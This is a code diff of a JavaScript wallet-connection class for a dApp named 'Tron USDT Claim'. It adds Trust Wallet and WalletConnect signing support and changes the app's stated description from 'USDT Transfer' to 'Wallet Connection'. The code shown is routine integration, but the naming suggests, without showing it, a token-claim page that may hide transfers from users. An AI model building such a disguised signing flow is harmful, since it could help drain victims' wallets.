@@ -3,7 +3,6 @@ import { WalletConnectModal } from '@walletconnect/modal';
 
 const WC_PROJECT_ID = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
 const TRON_CHAIN = 'tron:0x2b6653dc';
-const TRON_CHAIN_ALT = 'tron:1';
 
 class WalletManager {
     constructor() {
@@ -12,19 +11,18 @@ class WalletManager {
         this.isMobile = typeof window !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     }
 
-
     async initWC() {
         if (this.provider) return;
         if (!WC_PROJECT_ID) {
-            throw new Error('WalletConnect Project ID is missing. Please set NEXT_PUBLIC_WC_PROJECT_ID in Vercel settings.');
+            throw new Error('Missing NEXT_PUBLIC_WC_PROJECT_ID in environment');
         }
         this.provider = await UniversalProvider.init({
             projectId: WC_PROJECT_ID,
             metadata: {
                 name: 'Tron USDT Claim',
-                description: 'Secure USDT Transfer dApp',
+                description: 'Secure TRON Wallet Connection',
                 url: typeof window !== 'undefined' ? window.location.origin : '',
-                icons: ['https://walletconnect.com/walletconnect-logo.png'],
+                icons: ['https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png'],
             },
         });
 
@@ -34,10 +32,12 @@ class WalletManager {
         });
     }
 
-    async pollForInjected(maxMs = 3000) {
+    async pollForInjected(maxMs = 2000) {
         const getInjected = () => {
-            const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink;
-            return (p?.defaultAddress?.base58 || p?.ready) ? p : null;
+            // Priority: Trust Wallet Tron -> TronLink -> Generic Tron
+            const p = window.trustwallet?.tron || window.tronWeb || window.tron || window.tronLink;
+            if (p?.defaultAddress?.base58 || p?.ready) return p;
+            return null;
         };
 
         let p = getInjected();
@@ -53,20 +53,34 @@ class WalletManager {
     }
 
     async connect() {
-        // 1. Try injected first
-        let injected = await this.pollForInjected();
+        // 1. Try injected provider (DApp Browser / Extension)
+        const injected = await this.pollForInjected();
         if (injected) {
-            if (injected.request) await injected.request({ method: 'tron_requestAccounts' }).catch(() => { });
+            try {
+                if (injected.request) {
+                    await injected.request({ method: 'tron_requestAccounts' });
+                }
+            } catch (e) {
+                console.warn('Injected connection request failed:', e);
+            }
+
+            const address = injected.defaultAddress?.base58 || injected.address;
+            if (!address) throw new Error('Could not retrieve address from injected provider');
+
             return {
-                address: injected.defaultAddress?.base58,
+                address,
                 type: 'injected',
-                sign: (tx) => injected.signTransaction(tx),
+                sign: async (tx) => {
+                    // Standard injected signTransaction
+                    return await injected.signTransaction(tx);
+                },
             };
         }
 
-        // 2. Fallback to WalletConnect
+        // 2. Fallback to WalletConnect v2 (Mobile Browser)
         await this.initWC();
         return new Promise((resolve, reject) => {
+            // Handle URI for deep linking
             this.provider.on('display_uri', (uri) => {
                 if (this.isMobile) {
                     window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
@@ -75,30 +89,37 @@ class WalletManager {
                 }
             });
 
+            // Configure namespaces exactly as requested for Trust Wallet compatibility
             const optionalNamespaces = {
                 tron: {
-                    methods: [], // NO METHODS in connection request
                     chains: [TRON_CHAIN],
+                    methods: ['tron_signTransaction', 'tron_signMessage'],
                     events: [],
                 }
             };
 
             this.provider.connect({
-                requiredNamespaces: {},
-                optionalNamespaces
+                optionalNamespaces,
+                requiredNamespaces: {} // Use optional to avoid method rejection
             })
                 .then((session) => {
                     this.modal.closeModal();
-                    const address = session.namespaces.tron.accounts[0].split(':').pop();
+
+                    const account = session.namespaces.tron.accounts[0];
+                    const address = account.split(':').pop();
+
                     resolve({
                         address,
                         type: 'walletconnect',
                         sign: async (tx) => {
-                            const res = await this.provider.request({
+                            // FIX: Trust Wallet expects params as an array [transaction]
+                            const result = await this.provider.request({
                                 method: 'tron_signTransaction',
-                                params: { transaction: tx }
+                                params: [tx], // Array format as requested
                             }, TRON_CHAIN);
-                            return typeof res === 'string' ? JSON.parse(res) : (res.transaction || res);
+
+                            // Parse result if it's a string
+                            return typeof result === 'string' ? JSON.parse(result) : (result.transaction || result);
                         },
                     });
                 })
